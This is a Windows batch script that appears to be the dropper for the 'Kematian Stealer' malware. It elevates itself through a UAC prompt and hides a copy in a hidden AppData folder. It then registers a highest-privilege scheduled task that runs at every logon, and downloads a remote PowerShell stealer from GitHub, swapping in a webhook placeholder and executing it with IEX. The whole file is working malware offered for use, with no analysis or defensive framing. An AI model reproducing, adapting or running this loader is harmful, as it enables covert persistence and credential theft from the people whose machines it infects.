@echo off
cd /d %~dp0

net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)

set "pathplz=%USERPROFILE%\Appdata\Roaming\Kematian"

if not exist %pathplz% (
    mkdir %pathplz%
    attrib +s +h %pathplz%
)

copy %~f0 %pathplz%\Kematian.bat >nul
powershell -c "$task_name = 'Kematian';$task_action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c %%appdata%%\Kematian\Kematian.bat';$task_trigger = New-ScheduledTaskTrigger -AtLogOn;$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable;Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description 'Kematian' -RunLevel Highest -Force"
::vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)

powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | IEX"

Exit 0